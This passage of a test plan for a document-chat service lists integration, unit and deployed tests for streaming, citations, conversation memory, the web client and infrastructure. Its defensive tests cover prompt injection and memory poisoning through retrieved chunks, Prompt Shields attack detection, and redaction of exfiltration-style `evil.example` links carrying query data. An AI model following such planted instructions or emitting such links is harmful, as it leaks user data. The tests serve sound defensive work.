| T-269 | the turn timeout integration test | integration | A stub that streams for 200 s with `chat.max_turn_seconds` 180 ends with `turn_timeout` at 180 s ± 2 s. |
| T-270 | the stream response headers integration test | integration | The response carries `application/x-ndjson`, `Cache-Control: no-store` and `X-Content-Type-Options: nosniff`, no `Content-Length`, and no `Content-Encoding` when the request sends `Accept-Encoding: gzip, br`. |
| T-271 | the deployed stream compression test | deployed smoke | Through platform authentication, a chat stream requested with `Accept-Encoding: gzip, br` has no `Content-Encoding`. |
| T-272 | the client disconnect integration test | integration | A disconnect after two `delta` events closes the stub model's stream within 1 s (`clientDisconnected` in `GET /_stub/stats` within 2 s) and stores the turn `cancelled` with the partial text; a disconnect before the usage chunk gives an estimated answer record with the counters rising by exactly those amounts; a disconnect after the model stream ended leaves the turn `completed` with no follow-ups stored. |
| T-273 | the drain integration test | integration | SIGTERM to a worker during a stream that would outlast 90 s ends the stream with `error` `service_restarting` (`retryAfterSeconds` 5) at 90 s ± 2 s, the turn stored `failed` with that code, `docchat.chat.drained_turns` incremented, a registered background task cancelled and the worker gone before 110 s; a turn already finalised at the drain point ends with `done` and stays `completed`. |
| T-274 | the usage record unit test | unit | A usage record built from a usage chunk carrying cached, cache-write and reasoning tokens; a missing chunk giving an estimated record; cost in micro-units with half-up rounding; a model without a rate giving a `null` cost and incrementing `docchat.pricing.rate_missing`. |
| T-275 | the deployed pricing check | deployed (before users are assigned in `prod`) | `pricing.model_rates` holds an entry for every deployed model, and `docchat.pricing.rate_missing` stays 0 over one hour of traffic. |
| T-276 | the citation integration tests (also: the citation-content header tests) | integration | A PDF, a DOCX and a PPTX citation each return `openAs: pdf_page`, the page file name and `documentPdfAvailable` `true`; `getCitationContent` returns the single cited page and `getCitationDocument` the whole-document rendition, each with `application/pdf`, `Content-Disposition: attachment` with `filename*=UTF-8''`, `Content-Security-Policy: sandbox`, `no-store`, `nosniff` and the right `Content-Length`; a superseded version and a deleted document answer `410 document_changed`; an unmapped index, another user's session, a removed membership, a streaming turn and an unknown number answer `404 citation_not_found`, each refusal in order and on all three citation operations; a version with `document_pdf_status` `too_large` answers `getCitation` `200` with `documentPdfAvailable` `false`, `getCitationContent` `200` and `getCitationDocument` `409 document_pdf_unavailable` with no blob read and no lease left behind; the blob recorder finds no read under `documents/` for any citation of any format. Also named "the citation-content tests" and "the citation-content header tests". |
| T-277 | the page file name unit test | unit | A page file name built from a 255-code-point `source_name` (page 2,000) is at most 255 code points and ends in `-page-2000.pdf`; a whole-document file name from the same `source_name` is at most 255 code points and ends in `.pdf`; both content routes pass the name to `content_disposition(name)` and send `attachment`. |
| T-278 | the download lease integration test | integration | With `ratelimit.max_concurrent_downloads` 2, three concurrent requests by one user, two `getCitationContent` and one `getCitationDocument`, held open by slow readers give two `200` and one `429 too_many_downloads` with `retryAfterSeconds` 10; a new request gets `200` once one completes; a `404` after the lease leaves no lease behind. |
| T-279 | the download limits integration test (also: the download-limit tests) | integration | The 31st `getCitationContent`, `getCitationDocument` or `adminGetDocumentPdf` request by one user within a minute, the three counted together, gets `429 rate_limited` with `retryAfterSeconds` and `Retry-After`; a client that stops reading is aborted after 30 s ± 2 s with `citation_download_aborted` (`slow_client`) and its lease deleted; with a fake clock, a download still running at 300 s is aborted (`duration`). Together with the download lease test, also named "the download-limit tests". |
| T-280 | the chat end-to-end browser test | browser | Against the stub API: a question produces deltas, citations and follow-ups; Stop leaves a `cancelled` turn; a PDF citation shows its page; a DOCX citation shows the cited page of its converted PDF; Download full document saves the whole-document rendition as `<stem>.pdf`. |
| T-281 | the deployed chat test | deployed smoke | A chat turn on the seeded test project ends with `done` and citations, its `meta` line arrives within 3 s (no buffering by platform authentication), and the citation's content is a PDF served with `Content-Security-Policy: sandbox`. |
| T-282 | the deployed chat telemetry check | deployed (stage acceptance) | In `dev`, `docchat.ttft_ms` appears on `docchat.chat.turn` spans and the `docchat.openai.tokens` and `docchat.openai.estimated_cost` metrics appear in Application Insights within 15 minutes of a turn. Person-run by the stage's performer after the turn the deployed chat test makes as `member` in the `full` run, with `uv run python -m docchat_testing.logquery chat-telemetry` (section 6.3). |
| T-609 | the rechecking citation integration test | withdrawn | Withdrawn at stage 3: every citation opens a PDF rendition and no uploaded file is served (ADR 0152); the citation integration tests and the citation rendition consistency integration test cover the citation operations. |
| T-283 | the citation rendition consistency integration test | integration | With a DOCX version whose converted PDF is produced anew under another `CONVERTER_VERSION`: after the Render that replaces its renditions and before the Flip that serves its new chunk set, a citation of the served chunk set, whose `chunk_sets.pdf_sha256` differs from the version's `converted_sha256`, answers `getCitation`, `getCitationContent` and `getCitationDocument` with `410 document_changed` and no blob read; a citation whose chunk set holds a `NULL` `pdf_sha256`, or whose version holds a `NULL` `converted_sha256` while Render runs, answers the same; after the Flip, a citation of the new chunk set opens its page with `200`; `docchat.citation.requests` counts the refusals with `outcome` `gone` and a `too_large` refusal with `outcome` `unavailable`. |

### 5.7 Conversations and memory (T-291 to T-333)

| ID | Test | Level | Proves |
|---|---|---|---|
| T-291 | the first-turn batch integration test | integration | A first turn creates the session and the turn in one transactional batch (`seq` 1, `turnCount` 1, `activeTurn` set); a forced failure of the turn create leaves no session. |
| T-292 | the turn sequence integration test | integration | 20 sequential turns get `seq` 1 to 20 with no gap, `failed` and `cancelled` turns keeping their numbers. |
| T-293 | the two-turn concurrency test | integration | Two turns started in one session with different `clientTurnId`s: exactly one starts, the other gets `409 turn_in_progress`, and no `seq` is duplicated or skipped. |
| T-294 | the identical first-turn concurrency test | integration | 10 identical first-turn requests leave one session and one turn; the others get `409 turn_in_progress` while it streams and a replay after it completes. |
| T-295 | the session turn-limit unit test | unit | `session_turn_limit` renders with `sessionId` and without `turnId`. |
| T-296 | the abandoned-turn integration test | integration | With an injected clock, a turn left `streaming` past `deadlineAt` is marked `failed` / `turn_abandoned` by the next start's batch, which creates `seq` + 1. |
| T-297 | the finalisation integration tests | integration | A summary lease written between start and finalisation causes a `412` on the session, which is retried and adds `historyTokens` once; a batch whose response is lost after commit returns `saved: true` without a second `turns_finalized` increment; a turn taken over before finalisation returns `saved: false` and stays `turn_abandoned`. |
| T-298 | the conversation disconnect integration test | integration | A disconnect after `citations` leaves the turn `completed` and in the next turn's history; a disconnect during generation stores `cancelled` with the partial answer, absent from the history, standalone-query and summary inputs the model stub captured. |
| T-299 | the `read_recent_turns` integration test | integration | 12 completed turns under 3,000 tokens are all returned oldest first, without citation tokens and with their `followups`; with `max_tokens` 1,000 and 30 unsummarised turns of 300 tokens the newest 4 are returned and the second page is never requested. |
| T-300 | the large-turn finalisation integration test | integration | A 4,000-code-point question with a 100,000-code-point answer finalises with token counting in a worker thread and no event-loop block over 100 ms under the loop guard. |
| T-301 | the Cosmos DB data-access audit | integration | Over every chat, conversation and memory integration test, every call between `begin_turn` and the terminal event names the full `[oid, sessionId]` key, and the only prefix queries on `[userId]` are `listSessions` and the after-response extraction re-check (section 2.11). |
| T-302 | the `listSessions` unit tests | unit | Cursors of both list operations reused with another filter, garbage, tampered, oversized and wrong-version cursors answer `422 invalid_cursor`. |
| T-303 | the `listSessions` integration tests | integration | Newest-first order over 5 sessions with `limit` 2 gives 3 pages; the `projectId` filter applies; `listSessionTurns` pages oldest first. |
| T-304 | the session-list scale test | integration | `listSessions` for a user with 2,000 reachable projects answers within the plan audit's limits and returns only reachable projects' sessions. |
| T-305 | the `TurnView` unit test | unit | A `TurnView` serialises with exactly its 13 keys, and a `streaming` turn past its deadline maps to `failed` / `turn_abandoned`. |
| T-306 | the conversation route integration test | integration | With the real limiters: every route of `13-conversations-and-memory.md` is a `DocChatRoute` on the `/v1` router; the three body routes answer `401` without a token even with invalid JSON or a 70,000-byte body; with the burst bucket empty every operation answers `429 too_many_requests` with no Cosmos DB call; with the write window full the five writes answer `429 write_rate_limited` and the four reads don't; with the `usage` container failing the five writes answer `503 dependency_unavailable` and nothing is written. |
| T-307 | the title unit test | unit | Whitespace and line breaks collapse; Cc, Cf, Co and Cs characters go; 80 code points stay whole; a 200-character question is cut at a space at position 40 or later with `…`, at 79 without such a space; trailing `.,;:-` go; emoji and right-to-left text are kept. |
| T-308 | the fold-set unit test | unit | The newest turn is always kept, `summary.keep_recent_tokens` is respected with no turn-count bound (40 turns of 25 tokens all kept), an empty fold set makes no call, the oldest prefix folds under `summary.max_input_tokens`, and a single oversized turn is cut at a sentence end. |
| T-309 | the summary rebuild integration test | integration | Crossing 3,000 unsummarised tokens gives exactly one rebuild after the stream, with `coversThroughSeq`, `version` and `unsummarisedTokens` as `13-conversations-and-memory.md` section 6.6 states, and no call when nothing can be folded. |
| T-310 | the summary race concurrency test | integration | Two after-response tasks racing on one due session make exactly one `summary` call and one `version` increment. |
| T-311 | the after-response recovery integration test | integration | An after-response task killed after its claims is completed once the leases expire by the next turn (in another session for the extraction, in the same session for the summary). |
| T-312 | the summary back-off integration test | integration | With an injected clock, summary failures back off 1, 2 and 4 minutes and a success resets `consecutiveFailures` and `notBefore`. |
| T-313 | the quota deferral unit tests | unit | With replayed Cosmos DB responses and `check_token_quota` raising `UsageStoreUnavailable` or answering `allowed` false, the rebuild makes no call, releases its lease once with the failure fields unchanged and ends `deferred_quota`; the extraction makes no call, returns to `pending` with `attempts` unchanged three times in a row and ends `done` on a fourth run with `allowed` true. |
| T-314 | the summary-output unit test | unit | Citation tokens and nonce lines are removed, an over-long text is cut at a sentence end, and finish reason `length` maps to `invalid_output`. |
| T-315 | the memory-output unit test | unit | Invalid JSON maps to `invalid_output` and a refusal to zero operations. |
| T-316 | the extraction integration test | integration | A question stating the user's role yields one `extracted` fact, a `memory.facts_extracted` audit row without fact text and the turn `done`. |
| T-317 | the memory-poisoning integration tests | integration | A retrieved chunk asking to remember a rule about outside links, repeated by the stubbed answer, leaves the captured extraction request holding only the question and the stored facts and memory unchanged; a follow-up steered to state a fact about the user, sent as the next question, ends `{state: not_applicable, reason: suggested_question}` with no `memory` request even after a later re-check, `attach_followups` having returned `True` before the `followups` event; a first turn sending a project example question behaves the same; the same words in another order are extracted. |
| T-318 | the memory screening integration tests (also: the fact-screening tests against the model stub) | integration | With scripted screening results: an instruction-like proposal is rejected (`contains_instruction` or `contains_link`) and counted; a non-English proposal with `addressesAssistant` true is rejected as `contains_instruction` with no screening call; an `updateMemoryFact` text that passes the validators but gets a scripted attack answers `422 contains_instruction` at `body.text` with memory unchanged and no audit row; two scripted `503`s answer `503 dependency_unavailable`; a category-only change makes no screening call; screening unavailable during extraction returns the turn to `pending` with `attempts` unchanged, completed by a later re-check. |
| T-319 | the sensitive-proposal integration test | integration | Proposals labelled `sensitive_personal`, `secret_or_identifier` or `about_another_person` are dropped. |
| T-320 | the superseded extraction integration test | integration | A fact deleted after a turn completed but before its extraction ran makes the extraction end `superseded` and add nothing. |
| T-321 | the paused and disabled memory integration tests | integration | Paused memory leaves no `USER_PREFERENCES` block in the captured answer prompt and ends extraction `skipped_paused`; the next turn after resuming is extracted; `memory.enabled` false gives no block and no extraction while every memory operation works and `getMemory` reports `enabled: false`. |
| T-322 | the memory concurrency tests | integration | Two `updateMemoryFact` calls with one ETag end one `200` and one `412`; an extraction between `getMemory` and an edit makes the edit `412`; after one tab deletes fact F, the other tab's `deleteMemoryFact(F)` and `updateMemoryFact(F)` with the old `If-Match` or none answer `404 memory_fact_not_found`; with no memory document `clearMemory` answers `412`; no write and no audit row in any case. |
| T-323 | the memory cap integration test | integration | With 50 facts, extraction rejects adds as `cap_reached`, and an edit above the token cap answers `422 memory_full`. |
| T-324 | the memory validator unit tests | unit | At least 3 passing and 3 failing fixtures per reason, the examples of `13-conversations-and-memory.md` section 7.9 included; the duplicate tests match case and punctuation variants and same-category word sets with Jaccard similarity of at least 0.85, but not another category. |
| T-325 | the `get_prompt_memory` unit test | unit | Category order and labels, newest first within a category, the cap dropping the least recently updated facts, and an empty list when paused, disabled or empty. |
| T-326 | the feedback integration tests | integration | Up, down, a change that keeps `createdAt`, the category rule, the comment limit, `409` on `streaming` and `failed` turns, an injected Cosmos DB failure answering `503` with nothing stored, concurrent feedback and follow-ups both persisting, a captured `turn_feedback_saved` event with exactly its 7 keys and a `docchat.feedback.saved` data point with only `rating` and `category`. |
| T-327 | the feedback unit test | unit | `category_requires_down`, comment normalisation, `too_long` at 2,001 code points and `comments_disabled`. |
| T-328 | the time-to-live emulator integration test | integration | A container with a 5-second `defaultTtl` expires items 5 s after their last change, and nothing expires under `-1`. |
| T-329 | the user-data command emulator integration test (also: the user-data command integration tests; the export, delete and verify integration tests) | integration | `docchat-ops user export`, `delete` and `verify` export a seeded user completely (hidden sessions included, manifest hashes verifying), delete every item and row except audit rows and actor columns, change nothing on a second run, exit 0 from `verify`, and leave another user's data untouched. |
| T-330 | the `redact-document` emulator integration test (also: the redaction integration test) | integration | With traces of two users citing document D (whose chunk holds a canary) and one trace citing only document E: no trace contains the canary; every changed trace is byte-identical outside D's `SOURCE` block bodies, `redactedAt` and the system fields; E's trace is untouched; one `document.traces_redacted` row with `traceCount` 2; the output lists the two (`userId`, `sessionId`) pairs; the turns' `answer` and the sessions' `summary.text` are unchanged; a second run reports `traceCount` 0 and exits 0; a run stopped after the first trace exits 5 and a rerun completes it. |
| T-331 | the deployed chat-small latency test | operator check (dev) | Part of the `chat model-check` run of T-250 (`86-operations.md` section 2.8.7), run by a member of `sg-docchat-dev-config-operators` (just-in-time) at the conversations-and-memory stage's acceptance and recorded by the stage's performer: 20 `summary`-shaped and 20 `memory`-shaped calls against the real chat-small deployment, with `summary.reasoning_effort` and `memory.reasoning_effort` (`low` by default), have p95 durations within `summary.timeout_seconds` and `memory.timeout_seconds`; the row's `latency` member records both p95 values and their timeouts. |
| T-332 | the deployed Prompt Shields request test | operator check (dev) | Part of the `chat model-check` run of T-250, run at the chat-pipeline stage's acceptance and recorded by the stage's performer: `{"userPrompt": "Works on supplier contract renewals", "documents": []}` sent to the `dev` Content Safety account gets `200` with `userPromptAnalysis.attackDetected` false, or `400`, which ADR 0062 then records with the omitted `documents` field; the row's `promptShields` member records the status code and `attackDetected`. |
| T-333 | the conversation browser tests | browser | After 3 questions and a page reload the chat shows 3 turns with citations, feedback state and follow-ups on the newest turn only, with links only for `allowedLinks`; the memory screen edits, deletes, clears, pauses and resumes and shows the refresh prompt on a stale edit (`412`); feedback shows success only after `200`, and an injected `503` shows the error with its correlation ID. |

### 5.8 Web client (T-341 to T-420)

| ID | Test | Level | Proves |
|---|---|---|---|
| T-341 | the `loadConfig` unit test | unit | `loadConfig` accepts the four valid members and rejects an extra member, a missing member, an upper-case or malformed UUID, an `http:` API origin off a loopback host, an origin with a path or a trailing slash, and a scope not ending in `/access_as_user`, each rejection showing the configuration error screen. |
| T-342 | the generator unit test | unit | `write-env-config.mjs` writes `config.json` byte for byte and `staticwebapp.config.json` equal to the template with the API origin substituted, and exits 1 writing nothing for each invalid input, a loopback origin without `--allow-loopback` and a site configuration above 20,480 bytes. |
| T-343 | the build-output gate unit test (also: the build-output gate `check-dist`) | unit | `check-dist.mjs` fails on a planted `.map` file, a planted `config.json`, an inline script, a `style=` attribute, each forbidden string of `10-web-client.md` section 1.7 and an initial JavaScript size above 500 KB gzip-compressed, and passes on the clean build. |

In the rendered HTML, a refused bare `https://evil.example/c?d=secret` shows as `[link removed]` and holds no `a`; so do a refused URL inside a code block, inside an inline code span, inside image alt text (`![https://evil.example/p?d=1](x.png)`), inside raw `<img src=https://evil.example/p?d=1>` text and inside a refused link's text; `www.evil.example/p`, `WWW.evil.example/p`, `ftp://evil.example/p` and the protocol-relative `//evil.example/p` in `<img src=//evil.example/p>` text are redacted; a URL split by emphasis (`https:*//*evil.example/p`), by an inline code span and by U+200B or U+00AD is redacted as one; `https://docs.example/a` stays as written in prose and in a code block, and `https://docs.example/b?x=1` as an autolink renders as a link; trailing punctuation stays after the marker or the kept URL: `https://evil.example/p.` gives `[link removed].`, `(https://evil.example/p)` gives `([link removed])`, `https://docs.example/a,` keeps `https://docs.example/a` and its comma, and `redactRefusedUrls` on the text `https://evil.example/p&amp;` keeps `&amp;` after the marker; of a run of 40 letters directly before `://evil.example/p`, the first 8 stay and the rest is redacted with the URL; `name@example.net`, `mailto:name@example.net` and `example.net/abc` stay; before `allowedLinks` arrives `https://docs.example/a` shows as `[link removed]`, and after it arrives it stays; a citation between `https:` and `//evil.example/p` leaves `https:` as text, and `//evil.example/p` is redacted as a protocol-relative address; the speakable text and both plain-text fallbacks carry the same redaction; `redactRefusedUrls` returns within 200 ms for 200,000 letters with no white space. |

### 5.9 Infrastructure (T-421 to T-478)

| ID | Test | Level | Proves |
|---|---|---|---|
| T-421 | the `infra-validate` build checks | CI check | `bicep build` of `main.bicep` and `shared.bicep`, `bicep build-params` of `main.bicepparam` with `AZURE_ENV_NAME` `dev`, `prod` and `load`, and `bicep lint` with every analyzer rule at `error` pass. |
| T-422 | the `check_bicep_modules.py` check | CI check | The compiled templates hold no `-preview` API version other than `Microsoft.Insights/diagnosticSettings@2021-05-01-preview` and every AVM call sets `enableTelemetry: false`; the script fails both seeded violations. |
| T-423 | the PSRule runs | CI check | PSRule with baseline `Azure.GA_2025_12` and the custom rules of `83-infrastructure.md` section 13.3 (among them `DocChat.OpenAI.DeploymentRules`) reports no unsuppressed failure for `dev`, `prod` and `load`, and every suppression group carries `expiresOn` and a `# Synopsis:`; SARIF goes to code scanning. |
| T-424 | the compiled-template network checks (also: the network checks of the compiled template) | infrastructure | The compiled template for each environment holds the subnets, delegations and network security rules of `83-infrastructure.md` section 4.3 exactly, 13 private endpoints and 10 private DNS zones. |
| T-425 | the compiled-template role-assignment check (also: the role-assignment check of the compiled template) | infrastructure | Every role assignment in the compiled templates equals the call matrices of `83-infrastructure.md` section 6, and no assignment names a person. |
| T-426 | the compiled-template check of diagnostic categories | infrastructure | Every diagnostic setting in the compiled templates enables exactly the categories of `83-infrastructure.md` section 2.19, so `AppServiceHTTPLogs`, `AppServiceConsoleLogs`, `AppServiceAuthenticationLogs` and the host account's `StorageRead` are never collected. |
| T-427 | the compiled-template retention check | infrastructure | Each Cosmos DB container's `defaultTtl` and each workspace table's retention in the compiled templates equal `80-data-model.md` and `83-infrastructure.md`. |
| T-428 | the compiled-template backup check | infrastructure | The Cosmos DB continuous-backup tier and the SQL backup retention in the compiled templates equal `83-infrastructure.md`. |
| T-429 | the test-vault template check | infrastructure | `infra/shared.bicep` built with `ciPrivateNetworking: false` (the default) and an empty `sharedOperatorIpAllowlist` gives the test vault `publicNetworkAccess: 'Enabled'`, `defaultAction: 'Deny'`, `bypass: 'None'` and no `ipRules`, and declares no CI network, private endpoint or `privatelink.vaultcore.azure.net` zone; with two addresses, exactly those two `ipRules`; with `ciPrivateNetworking: true` and an empty list, `publicNetworkAccess: 'Disabled'`, the vault's private endpoint in `snet-ci-private-endpoints` and the zone linked only to `vnet-docchat-ci`. |

| T-447 | the deployed publishing-surface test | deployed (`infra` suite) | The API's SCM host refuses every request, and FTP and basic-authentication publishing are rejected. |

Default (`ciPrivateNetworking: false`): a `dev-tests` job on `ubuntu-24.04` reading one `test-user-<alias>` secret as `id-docchat-citest` is refused with `403 ForbiddenByFirewall` before `firewall.py open --target vault`, succeeds inside the window and is refused again after `close`; the Activity Log holds the window's two `Microsoft.KeyVault/vaults/write` events under `id-docchat-citest` and no vault write by any other pipeline identity, and the vault lists no address outside the shared allowlist afterwards (this last check needs the shared allowlist, which no job holds, so the stage's performer makes it from their own shell). Private-networking option: a `dev-tests` job on `docchat-ci-private` resolves the test vault to an address in `snet-ci-private-endpoints` and reads one secret, while the same read from a standard `ubuntu-24.04` runner is refused. |

| T-472 | the budget persistence check | deployed (after a second provision) | `az consumption budget show` before and after a second provision of each environment shows `budget-docchat-<env>` with notifications `actual-50`, `actual-80` and `actual-100` to `ag-docchat-<env>-ops` and an unchanged start date. |

For the vault: `open` writes again when a recorded read-back lacks its address (a concurrent job's write) and gives up after 5 attempts; the probe treats `403 ForbiddenByFirewall` as not yet and exits 3 after 300 s; `close`, the always-run one included, leaves every other address alone, however long its job has run. |
